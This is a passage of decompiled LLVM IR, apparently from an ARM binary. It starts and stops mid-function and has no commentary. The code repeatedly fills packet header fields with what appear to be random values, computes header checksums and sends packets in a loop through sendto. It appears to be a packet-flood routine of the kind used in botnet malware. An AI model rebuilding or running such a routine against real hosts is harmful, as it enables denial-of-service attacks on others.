  %v1_daac = trunc i32 %v0_daac to i8
  %v2_daac = load i32, i32* @r4, align 4
  %v3_daac = add i32 %v2_daac, 2
  %v4_daac = inttoptr i32 %v3_daac to i8*
  store i8 %v1_daac, i8* %v4_daac, align 1
  %v0_dab0 = load i32, i32* @r8, align 4
  %v1_dab0 = load i32, i32* @r4, align 4
  %v2_dab0 = add i32 %v1_dab0, 4
  %v3_dab0 = inttoptr i32 %v2_dab0 to i32*
  store i32 %v0_dab0, i32* %v3_dab0, align 4
  %v0_dab4 = call i32 @function_117dc()
  store i32 %v1_d91c, i32* %ip.global-to-local, align 4
  %sext = mul i32 %v0_dab4, 16777216
  %v1_dabc = sdiv i32 %sext, 16777216
  store i32 %v1_dabc, i32* %r2.global-to-local, align 4
  %v3_dac0 = ashr i32 %sext, 31
  store i32 %v3_dac0, i32* %r3.global-to-local, align 4
  store i1 %v2_dac4, i1* %cpsr_z.global-to-local, align 1
  %v1_dac8 = trunc i32 %v3_dac0 to i8
  %v2_dac8 = load i32, i32* @r4, align 4
  %v3_dac8 = add i32 %v2_dac8, 15
  %v4_dac8 = inttoptr i32 %v3_dac8 to i8*
  store i8 %v1_dac8, i8* %v4_dac8, align 1
  %v0_dacc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_dad8.pre = load i32, i32* @r4, align 4
  br i1 %v0_dacc, label %.thread13, label %bb87

bb87:                                             ; preds = %bb86
  %v2_dacc = add i32 %v2_dad8.pre, 13
  %v3_dacc = inttoptr i32 %v2_dacc to i8*
  %v4_dacc = load i8, i8* %v3_dacc, align 1
  %v5_dacc = zext i8 %v4_dacc to i32
  %v2_dad0 = or i32 %v5_dacc, 8
  store i32 %v2_dad0, i32* %r3.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb86, %bb87
  store i32 %v6_d7cc, i32* @r1, align 4
  %v0_dad8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dad8 = trunc i32 %v0_dad8 to i8
  %v3_dad8 = add i32 %v2_dad8.pre, 14
  %v4_dad8 = inttoptr i32 %v3_dad8 to i8*
  store i8 %v1_dad8, i8* %v4_dad8, align 1
  %v0_dadc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dadc, label %bb89, label %bb88

bb88:                                             ; preds = %.thread13
  %v1_dadc = load i32, i32* %r3.global-to-local, align 4
  %v2_dadc = trunc i32 %v1_dadc to i8
  %v3_dadc = load i32, i32* @r4, align 4
  %v4_dadc = add i32 %v3_dadc, 13
  %v5_dadc = inttoptr i32 %v4_dadc to i8*
  store i8 %v2_dadc, i8* %v5_dadc, align 1
  br label %bb89

bb89:                                             ; preds = %.thread13, %bb88
  %v0_dae0 = load i32, i32* @r7, align 4
  %v1_dae0 = add i32 %v0_dae0, 40
  %v1_dae4 = inttoptr i32 %v1_dae0 to i8*
  %v2_dae4 = call i32 @function_119b8(i8* %v1_dae4)
  %v3_dae8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dae8, i32* %r3.global-to-local, align 4
  %v1_daec = add i32 %v3_dae8, 1
  store i32 %v1_daec, i32* %r4.global-to-local, align 4
  %v0_daf0 = load i32, i32* @fp, align 4
  %v9_daf0 = icmp eq i32 %v0_daf0, %v1_daec
  store i1 %v9_daf0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_daec, i32* %stack_var_-40, align 4
  %v8_daf8 = icmp sgt i32 %v0_daf0, %v1_daec
  br i1 %v8_daf8, label %dec_label_pc_d95c, label %dec_label_pc_dafc

dec_label_pc_dafc:                                ; preds = %bb89
  store i32 %v6_d7cc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_db04.preheader

dec_label_pc_db04.preheader:                      ; preds = %dec_label_pc_dafc, %dec_label_pc_dd70
  %v0_db0417 = phi i32 [ %v0_daf0, %dec_label_pc_dafc ], [ %v0_d870, %dec_label_pc_dd70 ]
  %stack_var_-168.0.ph = phi i32 [ %v1_d890, %dec_label_pc_dafc ], [ %v1_dd78, %dec_label_pc_dd70 ]
  %storemerge = add i32 %v6_d7cc, 20
  store i32 %storemerge, i32* @r8, align 4
  %v3_dcbc = icmp eq i32 %v6_d808, -1
  %v8_dcbc = icmp eq i32 %v6_d808, -1
  %v3_dcd8 = icmp eq i32 %v3_d864, 65535
  %v2_dd54 = icmp eq i32 %v1_d7f4, 0
  br label %dec_label_pc_db04

dec_label_pc_db04:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_db04.preheader
  %v0_db04 = phi i32 [ %v0_db0417, %dec_label_pc_db04.preheader ], [ %v0_dc40, %dec_label_pc_dbac ]
  %v2_db04 = icmp eq i32 %v0_db04, 0
  store i1 %v2_db04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp90 = icmp slt i32 %v0_db04, 1
  br label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %dec_label_pc_db0c, %dec_label_pc_db04
  br i1 %tmp90, label %dec_label_pc_db0c, label %dec_label_pc_db10

dec_label_pc_db10:                                ; preds = %dec_label_pc_db0c
  %v0_db10 = load i32, i32* @r8, align 4
  %v3_db10 = mul i32 %v0_db10, 65536
  store i32 %v3_db10, i32* %r2.global-to-local, align 4
  %tmp91 = mul i32 %v0_db10, 256
  %v1_db18 = and i32 %tmp91, 65280
  store i32 %v1_db18, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %tmp92 = udiv i32 %v0_db10, 256
  %v4_db24 = urem i32 %tmp92, 256
  %v5_db24 = or i32 %v4_db24, %v1_db18
  store i32 %v5_db24, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_db2c

dec_label_pc_db2c:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_db10
  %v1_db40 = phi i32 [ %v1_dc3c, %dec_label_pc_dbac ], [ 0, %dec_label_pc_db10 ]
  %v5_db30 = mul i32 %v1_db40, 24
  %v1_db34 = load i32, i32* @sb, align 4
  %v2_db34 = add i32 %v1_db34, %v5_db30
  store i32 %v2_db34, i32* %r3.global-to-local, align 4
  store i32 %v2_d638, i32* %ip.global-to-local, align 4
  %v1_db3c = add i32 %v2_db34, 20
  %v2_db3c = inttoptr i32 %v1_db3c to i8*
  %v3_db3c = load i8, i8* %v2_db3c, align 1
  %v4_db3c = zext i8 %v3_db3c to i32
  store i32 %v4_db3c, i32* %r2.global-to-local, align 4
  %v4_db40 = mul i32 %v1_db40, 4
  %v5_db40 = add i32 %v4_db40, %v2_d638
  %v6_db40 = inttoptr i32 %v5_db40 to i32*
  %v7_db40 = load i32, i32* %v6_db40, align 4
  store i32 %v7_db40, i32* @r5, align 4
  %v7_db44 = icmp eq i8 %v3_db3c, 31
  store i1 %v7_db44, i1* %cpsr_z.global-to-local, align 1
  %v1_db48 = add i32 %v7_db40, 20
  store i32 %v1_db48, i32* @r6, align 4
  %tmp100 = icmp ult i8 %v3_db3c, 32
  br i1 %tmp100, label %dec_label_pc_dc60, label %dec_label_pc_db50

dec_label_pc_db50:                                ; preds = %dec_label_pc_db2c
  store i32 %v6_d808, i32* %r1.global-to-local, align 4
  store i1 %v8_dcbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_dcbc, label %dec_label_pc_dcc8, label %dec_label_pc_db5c

dec_label_pc_db5c:                                ; preds = %dec_label_pc_dc60, %dec_label_pc_db50
  store i32 %v3_d864, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_dcd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dcd8, label %dec_label_pc_dce4, label %dec_label_pc_db70

dec_label_pc_db70:                                ; preds = %dec_label_pc_dcc8.dec_label_pc_db70_crit_edge, %dec_label_pc_db5c
  %v1_db74 = phi i32 [ %v1_db74.pre, %dec_label_pc_dcc8.dec_label_pc_db70_crit_edge ], [ 65535, %dec_label_pc_db5c ]
  store i32 %v3_d868, i32* %r3.global-to-local, align 4
  %v9_db74 = icmp eq i32 %v3_d868, %v1_db74
  store i1 %v9_db74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db74, label %dec_label_pc_dd00, label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %dec_label_pc_dce4.dec_label_pc_db7c_crit_edge, %dec_label_pc_db70
  %v1_db80 = phi i32 [ %v1_db80.pre, %dec_label_pc_dce4.dec_label_pc_db7c_crit_edge ], [ %v1_db74, %dec_label_pc_db70 ]
  store i32 %v3_d86c, i32* %ip.global-to-local, align 4
  %v9_db80 = icmp eq i32 %v3_d86c, %v1_db80
  store i1 %v9_db80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db80, label %dec_label_pc_dd1c, label %dec_label_pc_db88

dec_label_pc_db88:                                ; preds = %dec_label_pc_dd00.dec_label_pc_db88_crit_edge, %dec_label_pc_db7c
  %v1_db8c = phi i32 [ %v1_db8c.pre, %dec_label_pc_dd00.dec_label_pc_db88_crit_edge ], [ %v1_db80, %dec_label_pc_db7c ]
  store i32 %v5_d708, i32* %r1.global-to-local, align 4
  %v9_db8c = icmp eq i32 %v5_d708, %v1_db8c
  store i1 %v9_db8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db8c, label %dec_label_pc_dd38, label %dec_label_pc_db94

dec_label_pc_db94:                                ; preds = %dec_label_pc_dd1c.dec_label_pc_db94_crit_edge, %dec_label_pc_db88
  %v1_db98 = phi i32 [ %v1_db98.pre, %dec_label_pc_dd1c.dec_label_pc_db94_crit_edge ], [ %v1_db8c, %dec_label_pc_db88 ]
  store i32 %v6_d724, i32* %r2.global-to-local, align 4
  %v9_db98 = icmp eq i32 %v6_d724, %v1_db98
  store i1 %v9_db98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_db98, label %dec_label_pc_dd4c, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_dd38, %dec_label_pc_db94
  store i32 %v1_d7f4, i32* %r3.global-to-local, align 4
  store i1 %v2_dd54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dd54, label %dec_label_pc_dbac, label %dec_label_pc_dd60

dec_label_pc_dbac:                                ; preds = %dec_label_pc_dba0, %dec_label_pc_dd4c, %dec_label_pc_dd60
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_dbb0 = load i32, i32* @r7, align 4
  %v1_dbb0 = trunc i32 %v0_dbb0 to i8
  %v2_dbb0 = load i32, i32* @r5, align 4
  %v3_dbb0 = add i32 %v2_dbb0, 10
  %v4_dbb0 = inttoptr i32 %v3_dbb0 to i8*
  store i8 %v1_dbb0, i8* %v4_dbb0, align 1
  %v0_dbb4 = load i32, i32* @r7, align 4
  %v1_dbb4 = trunc i32 %v0_dbb4 to i8
  %v2_dbb4 = load i32, i32* @r5, align 4
  %v3_dbb4 = add i32 %v2_dbb4, 11
  %v4_dbb4 = inttoptr i32 %v3_dbb4 to i8*
  store i8 %v1_dbb4, i8* %v4_dbb4, align 1
  %v0_dbb8 = load i32, i32* @r5, align 4
  store i32 %v0_dbb8, i32* @r0, align 4
  %v2_dbbc = call i32 @function_fda0(i32 %v0_dbb8, i32 20)
  %v3_dbbc = trunc i32 %v2_dbbc to i8
  %v4_dbc028 = udiv i32 %v2_dbbc, 256
  %v1_dbc4 = trunc i32 %v4_dbc028 to i8
  %v2_dbc4 = load i32, i32* @r5, align 4
  %v3_dbc4 = add i32 %v2_dbc4, 11
  %v4_dbc4 = inttoptr i32 %v3_dbc4 to i8*
  store i8 %v1_dbc4, i8* %v4_dbc4, align 1
  %v3_dbc8 = load i32, i32* @r5, align 4
  %v4_dbc8 = add i32 %v3_dbc8, 10
  %v5_dbc8 = inttoptr i32 %v4_dbc8 to i8*
  store i8 %v3_dbbc, i8* %v5_dbc8, align 1
  %v0_dbcc = load i32, i32* @r6, align 4
  store i32 %v0_dbcc, i32* @r1, align 4
  %v0_dbd0 = load i32, i32* @sl, align 4
  store i32 %v0_dbd0, i32* %r2.global-to-local, align 4
  %v0_dbd4 = load i32, i32* @r8, align 4
  store i32 %v0_dbd4, i32* %r3.global-to-local, align 4
  %v0_dbd8 = load i32, i32* @r7, align 4
  %v1_dbd8 = trunc i32 %v0_dbd8 to i8
  %v3_dbd8 = add i32 %v0_dbcc, 16
  %v4_dbd8 = inttoptr i32 %v3_dbd8 to i8*
  store i8 %v1_dbd8, i8* %v4_dbd8, align 1
  %v0_dbdc = load i32, i32* @r7, align 4
  %v1_dbdc = trunc i32 %v0_dbdc to i8
  %v2_dbdc = load i32, i32* @r6, align 4
  %v3_dbdc = add i32 %v2_dbdc, 17
  %v4_dbdc = inttoptr i32 %v3_dbdc to i8*
  store i8 %v1_dbdc, i8* %v4_dbdc, align 1
  %v0_dbe0 = load i32, i32* @r5, align 4
  %v4_dbe4 = call i32 @function_fdfc(i32 %v0_dbe0, i32 %v0_dbcc, i32 %v0_dbd0, i32 %v0_dbd4)
  %v5_dbe4 = trunc i32 %v4_dbe4 to i8
  %v4_dbe829 = udiv i32 %v4_dbe4, 256
  %v1_dbec = trunc i32 %v4_dbe829 to i8
  %v2_dbec = load i32, i32* @r6, align 4
  %v3_dbec = add i32 %v2_dbec, 17
  %v4_dbec = inttoptr i32 %v3_dbec to i8*
  store i8 %v1_dbec, i8* %v4_dbec, align 1
  %v3_dbf0 = load i32, i32* @r6, align 4
  %v4_dbf0 = add i32 %v3_dbf0, 16
  %v5_dbf0 = inttoptr i32 %v4_dbf0 to i8*
  store i8 %v5_dbe4, i8* %v5_dbf0, align 1
  %v3_dbf4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dbf4, i32* %r3.global-to-local, align 4
  %v0_dbf8 = load i32, i32* @r5, align 4
  %v1_dbf8 = add i32 %v0_dbf8, 20
  %v2_dbf8 = inttoptr i32 %v1_dbf8 to i32*
  %v3_dbf8 = load i32, i32* %v2_dbf8, align 4
  %v3_dc00 = udiv i32 %v3_dbf8, 65536
  store i32 %v3_dc00, i32* %r2.global-to-local, align 4
  %v5_dc04 = mul i32 %v3_dbf4, 24
  %v1_dc08 = load i32, i32* @sb, align 4
  %v2_dc08 = add i32 %v1_dc08, %v5_dc04
  store i32 %v2_dc08, i32* %ip.global-to-local, align 4
  %v3_dc0c27 = udiv i32 %v3_dbf8, 16777216
  %v1_dc10 = trunc i32 %v3_dc0c27 to i8
  %v3_dc10 = add i32 %v2_dc08, 3
  %v4_dc10 = inttoptr i32 %v3_dc10 to i8*
  store i8 %v1_dc10, i8* %v4_dc10, align 1
  %v0_dc14 = load i32, i32* %r2.global-to-local, align 4
  %v1_dc14 = trunc i32 %v0_dc14 to i8
  %v2_dc14 = load i32, i32* %ip.global-to-local, align 4
  %v3_dc14 = add i32 %v2_dc14, 2
  %v4_dc14 = inttoptr i32 %v3_dc14 to i8*
  store i8 %v1_dc14, i8* %v4_dc14, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_dc1c = load i32, i32* @r5, align 4
  store i32 %v0_dc1c, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-168.0.ph, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_dc2c = load i32, i32* %ip.global-to-local, align 4
  %v6_dc34 = call i32 @_sendto(i32 %v3_d81c, i32 %v0_dc1c, i32 %stack_var_-168.0.ph, i32 16384, i32 %v0_dc2c, i32 16)
  %v3_dc38 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = add i32 %v3_dc38, 1
  %v0_dc40 = load i32, i32* @fp, align 4
  %v9_dc40 = icmp eq i32 %v0_dc40, %v1_dc3c
  store i1 %v9_dc40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_dc3c, i32* %stack_var_-40, align 4
  %v7_dc48 = icmp sgt i32 %v0_dc40, %v1_dc3c
  br i1 %v7_dc48, label %dec_label_pc_db2c, label %dec_label_pc_db04

dec_label_pc_dc50:                                ; preds = %dec_label_pc_d82c
  %v1_dc54 = call i32 @_close(i32 %v3_d81c)
  br label %dec_label_pc_dc58

dec_label_pc_dc58:                                ; preds = %dec_label_pc_d618, %dec_label_pc_dc50
  %v29_dc5c = phi i32 [ %v3_d81c, %dec_label_pc_d618 ], [ %v1_dc54, %dec_label_pc_dc50 ]
  store i32 %v3_d618, i32* %r4.global-to-local, align 4
  ret i32 %v29_dc5c

dec_label_pc_dc60:                                ; preds = %dec_label_pc_db2c
  %v1_dc60 = add i32 %v2_db34, 16
  %v2_dc60 = inttoptr i32 %v1_dc60 to i32*
  %v3_dc60 = load i32, i32* %v2_dc60, align 4
  store i32 %v3_dc60, i32* %r4.global-to-local, align 4
  %v0_dc64 = call i32 @function_117dc()
  %v3_dc68 = load i32, i32* %stack_var_-40, align 4
  %v5_dc70 = mul i32 %v3_dc68, 24
  %v1_dc78 = load i32, i32* @sb, align 4
  %v2_dc78 = add i32 %v1_dc78, %v5_dc70
  store i32 %v2_dc78, i32* %r1.global-to-local, align 4
  %v1_dc7c = and i32 %v3_dc60, 65280
  store i32 %v1_dc7c, i32* %r3.global-to-local, align 4
  %v1_dc74 = udiv i32 %v3_dc60, 256
  %v3_dc80 = and i32 %v1_dc74, 65280
  store i32 %v3_dc80, i32* %r2.global-to-local, align 4
  %v3_dc84 = mul i32 %v3_dc60, 16777216
  store i32 %v3_dc84, i32* %ip.global-to-local, align 4
  %v1_dc88 = add i32 %v2_dc78, 20
  %v2_dc88 = inttoptr i32 %v1_dc88 to i8*
  %v3_dc88 = load i8, i8* %v2_dc88, align 1
  %v4_dc88 = zext i8 %v3_dc88 to i32
  %v4_dc8c = mul nuw nsw i32 %v1_dc7c, 256
  %v5_dc8c = or i32 %v4_dc8c, %v3_dc84
  store i32 %v5_dc8c, i32* %ip.global-to-local, align 4
  %v2_dc94 = call i32 @llvm.bswap.i32(i32 %v3_dc60)
  %v7_dc98 = lshr i32 %v0_dc64, %v4_dc88
  %v8_dc98 = add i32 %v7_dc98, %v2_dc94
  store i32 %v8_dc98, i32* %r2.global-to-local, align 4
  %v2_dcb4 = call i32 @llvm.bswap.i32(i32 %v8_dc98)
  store i32 %v2_dcb4, i32* %r3.global-to-local, align 4
  store i32 %v6_d808, i32* %r1.global-to-local, align 4
  store i1 %v8_dcbc, i1* %cpsr_z.global-to-local, align 1
  %v1_dcc0 = load i32, i32* @r5, align 4
  %v2_dcc0 = add i32 %v1_dcc0, 16
  %v3_dcc0 = inttoptr i32 %v2_dcc0 to i32*
  store i32 %v2_dcb4, i32* %v3_dcc0, align 4
  br i1 %v3_dcbc, label %dec_label_pc_dcc8, label %dec_label_pc_db5c

dec_label_pc_dcc8:                                ; preds = %dec_label_pc_dc60, %dec_label_pc_db50
  %v0_dcc8 = call i32 @function_117dc()
  store i32 %v3_d864, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_dcd8, i1* %cpsr_z.global-to-local, align 1
  %v1_dcdc = load i32, i32* @r5, align 4
  %v2_dcdc = add i32 %v1_dcdc, 12
  %v3_dcdc = inttoptr i32 %v2_dcdc to i32*
  store i32 %v0_dcc8, i32* %v3_dcdc, align 4
  br i1 %v3_dcd8, label %dec_label_pc_dce4, label %dec_label_pc_dcc8.dec_label_pc_db70_crit_edge

dec_label_pc_dcc8.dec_label_pc_db70_crit_edge:    ; preds = %dec_label_pc_dcc8
  %v1_db74.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db70

dec_label_pc_dce4:                                ; preds = %dec_label_pc_dcc8, %dec_label_pc_db5c
  %v0_dce4 = call i32 @function_117dc()
  %v1_dce4 = trunc i32 %v0_dce4 to i8
  %v4_dce830 = udiv i32 %v0_dce4, 256
  %v1_dcec = trunc i32 %v4_dce830 to i8
  %v2_dcec = load i32, i32* @r5, align 4
  %v3_dcec = add i32 %v2_dcec, 5
  %v4_dcec = inttoptr i32 %v3_dcec to i8*
  store i8 %v1_dcec, i8* %v4_dcec, align 1
  store i32 %v3_d868, i32* %r3.global-to-local, align 4
  %v1_dcf4 = load i32, i32* @r4, align 4
  %v9_dcf4 = icmp eq i32 %v3_d868, %v1_dcf4
  store i1 %v9_dcf4, i1* %cpsr_z.global-to-local, align 1
  %v3_dcf8 = load i32, i32* @r5, align 4
  %v4_dcf8 = add i32 %v3_dcf8, 4
  %v5_dcf8 = inttoptr i32 %v4_dcf8 to i8*
  store i8 %v1_dce4, i8* %v5_dcf8, align 1
  %v0_dcfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dcfc, label %dec_label_pc_dd00, label %dec_label_pc_dce4.dec_label_pc_db7c_crit_edge

dec_label_pc_dce4.dec_label_pc_db7c_crit_edge:    ; preds = %dec_label_pc_dce4
  %v1_db80.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db7c

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dce4, %dec_label_pc_db70
  %v0_dd00 = call i32 @function_117dc()
  %v1_dd00 = trunc i32 %v0_dd00 to i8
  store i32 %v3_d86c, i32* %ip.global-to-local, align 4
  %v4_dd08 = sdiv i32 %v0_dd00, 256
  store i32 %v4_dd08, i32* %r3.global-to-local, align 4
  %v1_dd0c = load i32, i32* @r4, align 4
  %v9_dd0c = icmp eq i32 %v3_d86c, %v1_dd0c
  store i1 %v9_dd0c, i1* %cpsr_z.global-to-local, align 1
  %v3_dd10 = load i32, i32* @r5, align 4
  %v4_dd10 = add i32 %v3_dd10, 20
  %v5_dd10 = inttoptr i32 %v4_dd10 to i8*
  store i8 %v1_dd00, i8* %v5_dd10, align 1
  %v0_dd14 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd14 = trunc i32 %v0_dd14 to i8
  %v2_dd14 = load i32, i32* @r6, align 4
  %v3_dd14 = add i32 %v2_dd14, 1
  %v4_dd14 = inttoptr i32 %v3_dd14 to i8*
  store i8 %v1_dd14, i8* %v4_dd14, align 1
  %v0_dd18 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd18, label %dec_label_pc_dd1c, label %dec_label_pc_dd00.dec_label_pc_db88_crit_edge

dec_label_pc_dd00.dec_label_pc_db88_crit_edge:    ; preds = %dec_label_pc_dd00
  %v1_db8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db88

dec_label_pc_dd1c:                                ; preds = %dec_label_pc_dd00, %dec_label_pc_db7c
  %v0_dd1c = call i32 @function_117dc()
  %v1_dd1c = trunc i32 %v0_dd1c to i8
  store i32 %v5_d708, i32* %r1.global-to-local, align 4
  %v4_dd24 = sdiv i32 %v0_dd1c, 256
  store i32 %v4_dd24, i32* %r3.global-to-local, align 4
  %v1_dd28 = load i32, i32* @r4, align 4
  %v9_dd28 = icmp eq i32 %v5_d708, %v1_dd28
  store i1 %v9_dd28, i1* %cpsr_z.global-to-local, align 1
  %v1_dd2c = trunc i32 %v4_dd24 to i8
  %v2_dd2c = load i32, i32* @r6, align 4
  %v3_dd2c = add i32 %v2_dd2c, 3
  %v4_dd2c = inttoptr i32 %v3_dd2c to i8*
  store i8 %v1_dd2c, i8* %v4_dd2c, align 1
  %v3_dd30 = load i32, i32* @r6, align 4
  %v4_dd30 = add i32 %v3_dd30, 2
  %v5_dd30 = inttoptr i32 %v4_dd30 to i8*
  store i8 %v1_dd1c, i8* %v5_dd30, align 1
  %v0_dd34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dd34, label %dec_label_pc_dd38, label %dec_label_pc_dd1c.dec_label_pc_db94_crit_edge

dec_label_pc_dd1c.dec_label_pc_db94_crit_edge:    ; preds = %dec_label_pc_dd1c
  %v1_db98.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_db94

dec_label_pc_dd38:                                ; preds = %dec_label_pc_dd1c, %dec_label_pc_db88
  %v0_dd38 = call i32 @function_117dc()
  store i32 %v6_d724, i32* %r2.global-to-local, align 4
  %v1_dd40 = load i32, i32* @r4, align 4
  %v9_dd40 = icmp eq i32 %v6_d724, %v1_dd40
  store i1 %v9_dd40, i1* %cpsr_z.global-to-local, align 1
  %v1_dd44 = load i32, i32* @r6, align 4
  %v2_dd44 = add i32 %v1_dd44, 4
  %v3_dd44 = inttoptr i32 %v2_dd44 to i32*
  store i32 %v0_dd38, i32* %v3_dd44, align 4
  br i1 %v9_dd40, label %dec_label_pc_dd4c, label %dec_label_pc_dba0

dec_label_pc_dd4c:                                ; preds = %dec_label_pc_dd38, %dec_label_pc_db94
  %v0_dd4c = call i32 @function_117dc()
  store i32 %v1_d7f4, i32* %r3.global-to-local, align 4
  store i1 %v2_dd54, i1* %cpsr_z.global-to-local, align 1
  %v1_dd58 = load i32, i32* @r6, align 4
  %v2_dd58 = add i32 %v1_dd58, 8
  %v3_dd58 = inttoptr i32 %v2_dd58 to i32*
  store i32 %v0_dd4c, i32* %v3_dd58, align 4
  br i1 %v2_dd54, label %dec_label_pc_dbac, label %dec_label_pc_dd60

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dba0, %dec_label_pc_dd4c
  %v0_dd60 = load i32, i32* @r5, align 4
  %v1_dd60 = add i32 %v0_dd60, 40
  store i32 %v6_d7cc, i32* @r1, align 4
  %v1_dd68 = inttoptr i32 %v1_dd60 to i8*
  %v2_dd68 = call i32 @function_119b8(i8* %v1_dd68)
  br label %dec_label_pc_dbac

dec_label_pc_dd70:                                ; preds = %dec_label_pc_d854
  store i32 %v6_d7cc, i32* %r3.global-to-local, align 4
  %v1_dd78 = add i32 %v6_d7cc, 40
  store i32 %v1_dd78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_db04.preheader

; uselistorder directives
  uselistorder i32 %v1_dd78, { 1, 0 }
  uselistorder i32 %v4_dd24, { 1, 0 }
  uselistorder i32 %v2_dcb4, { 1, 0 }
  uselistorder i32 %v3_dc84, { 1, 0 }
  uselistorder i32 %v3_dc60, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_dc40, { 1, 2, 0 }
  uselistorder i32 %v1_dc3c, { 2, 0, 3, 1 }
  uselistorder i32 %v0_dbcc, { 1, 0, 2 }
  uselistorder i32 %v0_db10, { 2, 0, 1 }
  uselistorder i32 %v0_db04, { 1, 0 }
  uselistorder i1 %v2_dd54, { 2, 3, 1, 0 }
  uselistorder i1 %v3_dcd8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_daec, { 1, 0, 2, 3 }
  uselistorder i8 %v5_d950, { 1, 0 }
  uselistorder i32 %v1_d918, { 1, 0 }
  uselistorder i32 %v1_d914, { 1, 0 }
  uselistorder i32 %v1_d910, { 1, 0 }
  uselistorder i32 %v1_d8ec, { 1, 0 }
  uselistorder i32 %v1_d8e8, { 1, 0 }
  uselistorder i32 %v1_d8e4, { 1, 0 }
  uselistorder i32 %v1_d8d8, { 1, 0 }
  uselistorder i32 %v1_d8b4, { 1, 0 }
  uselistorder i32 %v1_d8a4, { 1, 0 }
  uselistorder i32 %v1_d890, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d870, { 1, 0, 2 }
  uselistorder i32 %v3_d864, { 0, 1, 3, 2 }
  uselistorder i32 %v0_d858, { 3, 0, 1, 2 }
  uselistorder i32 %v0_d854, { 0, 2, 1, 3 }
  uselistorder i1 %v7_d84c, { 1, 0 }
  uselistorder i1 %v7_d820, { 1, 0 }
  uselistorder i32 %v3_d81c, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v6_d808, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 %v1_d7f4, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_d7cc, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32 %v6_d724, { 3, 2, 1, 0 }
  uselistorder i32 %v5_d708, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 %v1_d6b8, { 1, 0 }
  uselistorder i32 %v6_d650, { 1, 0 }
  uselistorder i32 %v2_d638, { 0, 3, 1, 2 }
  uselistorder i32 %v1_d61c, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 37, 36, 39, 38, 0 }
  uselistorder label %dec_label_pc_dd60, { 1, 0 }
  uselistorder label %dec_label_pc_dc58, { 1, 0 }
  uselistorder label %dec_label_pc_dbac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_db04.preheader, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_dd8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dd8c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
